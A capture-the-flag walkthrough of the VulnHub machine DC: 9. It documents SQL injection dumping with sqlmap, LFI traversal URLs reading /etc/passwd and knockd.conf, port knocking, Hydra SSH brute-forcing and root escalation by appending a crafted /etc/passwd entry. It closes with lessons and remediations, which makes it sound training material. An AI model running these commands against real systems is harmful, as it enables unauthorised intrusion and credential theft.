# DC: 9 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.8 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/dc-9-vulnhub-walkthrough/) |

## Attack Summary

DC: 9 is a medium-difficulty VulnHub machine. The web application has an SQL injection vulnerability in its search form that exposes usernames, passwords, and port-knocking configuration via local file inclusion. SSH is protected by port knocking; the knock sequence is retrieved from `/etc/knockd.conf` through the LFI. Credential brute-forcing via Hydra finds a valid SSH user (`janitor`). Lateral movement to `fredf` exploits a hidden password list found in a dot directory. `fredf` can run a Python script as root via sudo that appends arbitrary content to arbitrary files, allowing `/etc/passwd` manipulation to create a root-level user.

## Methodology

1. Host discovery and port scan
2. Web application analysis — search form SQL injection
3. sqlmap — dump Staff and users databases
4. Admin login — LFI discovery
5. LFI to read `/etc/knockd.conf` — port knock sequence
6. Port knocking — open SSH
7. Hydra credential brute-force — SSH access as `janitor`
8. Hidden directory — additional password list
9. SSH as `fredf` — sudo misconfiguration exploitation
10. Append malicious entry to `/etc/passwd` — root shell

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.1.0/24
```

Target identified at `192.168.1.8`.

```bash
nmap -A 192.168.1.8
```

![nmap](images/01-nmap.png)

**Open ports:**

| Port | Service | Note |
|---|---|---|
| 22 | SSH | filtered |
| 80 | HTTP (Apache) | open |

Port 22 is filtered, suggesting port knocking.

## Step 2: SQL Injection — Database Enumeration

The web application has a search form. Capture the search request with Burp Suite and save it to `raj.txt`. Run sqlmap:

```bash
sqlmap -r raj.txt --dbs --batch
```

Two databases identified: `Staff` and `users`.

Dump both:

```bash
sqlmap -r raj.txt -D Staff --dump-all --batch
sqlmap -r raj.txt -D users --dump-all --batch
```

![enumeration](images/02-enum.png)

**Staff database:** Admin account with MD5 hash — cracks to `transorbital1`.

**users database:** UserDetails table with multiple usernames and plaintext passwords (for SSH brute-forcing later).

## Step 3: Admin Login and LFI Discovery

Log in to the web application as `admin:transorbital1`. The footer shows a "file does not exist" error after login, indicating a file inclusion function. Test path traversal:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/passwd
```

LFI confirmed. Read the port-knocking configuration:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/knockd.conf
```

**Port knock sequence extracted: 7469, 8475, 9842**

## Step 4: Port Knocking and SSH Brute-Force

Send the knock sequence to open SSH:

```bash
knock 192.168.1.8 7469 8475 9842
nmap -p22 192.168.1.8
# Port 22 now open
```

![exploit](images/03-exploit.png)

Create wordlists from the users database dump and run Hydra:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh
```

**Valid credential found: `janitor:Ilovepeepee`**

## Step 5: SSH Access and Lateral Movement

```bash
ssh janitor@192.168.1.8
ls -al
```

![shell](images/04-shell.png)

A hidden directory `secrets-for-putin` contains a file with additional passwords written on sticky notes. Add these to `pass.txt` and run Hydra again:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh
```

**Additional valid credential found: `fredf:B4-Tru3-001`**

```bash
su fredf
sudo -l
```

`fredf` can run `/opt/devstuff/test` as root without a password. Inspecting `/opt/devstuff/test.py`:

```python
# Appends contents of file1 to file2
```

## Step 6: Privilege Escalation — /etc/passwd Injection

Generate a password hash for a new root-level user:

```bash
openssl passwd -1 -salt pavan 123456
# Output: $1$pavan$qv9M3fBmtDPrOTBZflNl81
```

Write the new user entry to a temp file:

```bash
echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' >> /tmp/raj
```

Append it to `/etc/passwd` using the sudo-allowed script:

```bash
sudo /opt/devstuff/test /tmp/raj /etc/passwd
```

Switch to the new root user:

```bash
su pavan
# password: 123456
whoami
# root
cat /root/flag.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

- SQL injection in a search form cascaded into full database compromise, LFI exploitation, and ultimately system access. Input validation at the application layer is non-negotiable.
- Storing port-knocking configuration in a file readable via LFI defeats the security control entirely.
- A sudo rule that lets a low-privileged user run a file-appending script as root is equivalent to giving that user write access to every file on the system.
- Reusing passwords across multiple services allowed pivot from one compromised account to another.

## Remediation

| Vulnerability | Fix |
|---|---|
| SQL injection in search form | Use parameterized queries; sanitize all user input |
| Local File Inclusion | Validate and whitelist file parameter values; disable `allow_url_include` |
| Port knock config readable via LFI | Store sensitive configs outside the web-accessible path |
| Unsafe sudo rule (file-append script) | Remove the sudo rule; apply principle of least privilege |
| Password reuse | Enforce unique credentials per account; use a password manager |
